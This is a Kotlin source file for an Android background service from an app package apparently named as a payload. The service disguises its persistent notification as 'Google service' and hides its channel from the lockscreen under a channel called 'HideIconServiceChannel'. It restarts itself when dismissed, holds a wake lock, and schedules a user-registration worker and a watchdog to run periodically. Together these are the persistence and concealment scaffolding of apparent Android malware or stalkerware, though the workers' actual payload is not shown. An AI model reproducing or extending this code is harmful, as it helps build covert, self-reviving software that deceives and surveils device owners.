package com.payload.jansiix0ne.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.util.Log
import androidx.core.app.NotificationCompat
import com.payload.jansiix0ne.MainActivity
import com.payload.jansiix0ne.R
import com.payload.jansiix0ne.worker.RegisterUserWorker
import com.payload.jansiix0ne.worker.UnifiedWatchdogWorker
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import androidx.work.Constraints
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import java.util.concurrent.TimeUnit

/**
 * Foreground service that runs continuously in the background
 */
class UnifiedService : Service() {

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.Default)
    private var wakeLock: PowerManager.WakeLock? = null

    companion object {
        private const val TAG = "UnifiedService"
        private const val CHANNEL_ID = "HideIconServiceChannel"
        private const val NOTIFICATION_ID = 1
        
        @Volatile
        var isRunning = false
            private set
    }

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "UnifiedService onCreate")
        
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification())
        
        acquireWakeLock()
        schedulePeriodicWorkers()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (isRunning) {
            Log.d(TAG, "Already running, skip duplicate start")
            return START_STICKY
        }
        
        isRunning = true
        Log.d(TAG, "UnifiedService started")
        
        serviceScope.launch {
            // Perform background tasks
            performBackgroundTasks()
        }
        
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
        Log.d(TAG, "UnifiedService destroyed")
        
        releaseWakeLock()
        serviceScope.cancel()
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        // Restart service if task is removed
        val restartIntent = Intent(applicationContext, UnifiedService::class.java)
        startForegroundService(restartIntent)
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Background Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                setSound(null, null)
                enableVibration(false)
                enableLights(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
                setShowBadge(false)
            }
            
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager?.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        val intent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            intent,
            PendingIntent.FLAG_IMMUTABLE
        )
        
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Google service")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()
    }

    private fun acquireWakeLock() {
        try {
            val powerManager = getSystemService(POWER_SERVICE) as PowerManager
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "UnifiedService::lock"
            )
            
            if (!wakeLock!!.isHeld) {
                wakeLock!!.acquire(10 * 60 * 1000L) // 10 minutes
                Log.d(TAG, "WakeLock acquired")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to acquire wake lock: ${e.message}", e)
        }
    }

    private fun releaseWakeLock() {
        try {
            wakeLock?.let {
                if (it.isHeld) {
                    it.release()
                    Log.d(TAG, "WakeLock released")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to release wake lock: ${e.message}", e)
        }
    }

    private fun schedulePeriodicWorkers() {
        val workManager = WorkManager.getInstance(applicationContext)
        
        // Schedule RegisterUserWorker to run periodically
        val registerUserWork = PeriodicWorkRequestBuilder<RegisterUserWorker>(
            15, TimeUnit.MINUTES
        ).setConstraints(
            Constraints.Builder()
                .setRequiredNetworkType(androidx.work.NetworkType.CONNECTED)
                .build()
        ).build()
        
        workManager.enqueueUniquePeriodicWork(
            "register_user_work",
            ExistingPeriodicWorkPolicy.KEEP,
            registerUserWork
        )
        
        // Schedule UnifiedWatchdogWorker to run periodically
        val watchdogWork = PeriodicWorkRequestBuilder<UnifiedWatchdogWorker>(
            30, TimeUnit.MINUTES
        ).build()
        
        workManager.enqueueUniquePeriodicWork(
            "unified_watchdog_work",
            ExistingPeriodicWorkPolicy.KEEP,
            watchdogWork
        )
    }

    private suspend fun performBackgroundTasks() {
        // Background tasks can be performed here
        Log.d(TAG, "Performing background tasks")
    }
}
